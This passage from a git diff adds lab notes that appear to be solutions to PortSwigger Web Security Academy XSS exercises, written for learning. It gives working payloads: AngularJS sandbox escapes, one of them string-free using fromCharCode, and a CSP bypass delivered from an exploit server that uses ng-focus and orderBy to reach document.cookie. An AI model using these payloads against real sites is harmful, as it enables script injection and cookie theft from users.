@@ -45,3 +45,31 @@ Al escribir un string random en la barra de buscar vemos que se guarda en un par
 ```
 "onmouseover="alert(1)
 ```
+
+
+
+# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+- Enter a random alphanumeric string into the search box.
+- View the page source and observe that your random string is enclosed in an `ng-app` directive.
+- Enter the following AngularJS expression in the search box:
+
+`{{$on.constructor('alert(1)')()}}`
+
+# Lab: Reflected XSS with AngularJS sandbox escape without strings
+
+
+`https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+
+
+# Lab: Reflected XSS with AngularJS sandbox escape and CSP
+
+1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
+    
+    `<script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>`
+2. Click "Store" and "Deliver exploit to victim".
+
+The exploit uses the `ng-focus` event in AngularJS to create a focus event that bypasses CSP. It also uses `$event`, which is an AngularJS variable that references the event object. The `path` property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the `window` object.
+
+Normally, `|` is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the `orderBy` filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the `alert` function directly, we assign it to the variable `z`. The function will only be called when the `orderBy` operation reaches the `window` object in the `$event.path` array. This means it can be called in the scope of the window without an explicit reference to the `window` object, effectively bypassing AngularJS's `window` check.
+
